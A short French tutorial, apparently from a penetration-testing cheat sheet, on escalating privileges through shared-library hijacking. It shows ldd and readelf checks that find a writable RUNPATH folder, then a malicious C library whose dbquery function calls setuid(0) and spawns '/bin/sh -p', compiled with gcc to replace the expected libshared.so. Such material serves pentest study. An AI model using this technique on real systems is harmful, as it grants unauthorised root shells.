Un binaire peut parfois utiliser des librairies non standards, il est parfois possible de remplacer cette librairie par une autre qui nous accorderait des droits supplémentaires.

On analyse quelles librairies sont utilisées par l'exécutable:

```bash
ldd LeBinaire
```

```bash
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

On peut ensuite utiliser "readelf" afin de voir si ces librairies ne peuvent pas être loadées depuis un autre endroit:

```bash
readelf -d LeBinaire  | grep PATH

0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

Si le dossier est writeable, il est alors possible de remplacer cette librairie par une autre:

```bash
nano -w /development/libshared.c
```

```c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

```bash
gcc /development/libshared.c -fPIC -shared -o /development/libshared.so
```

Pendant l'exécution du programme "LeBinaire", notre librairie est appelée et lancera la commande définie avec les droits de l'utilisateur de "LeBinaire".
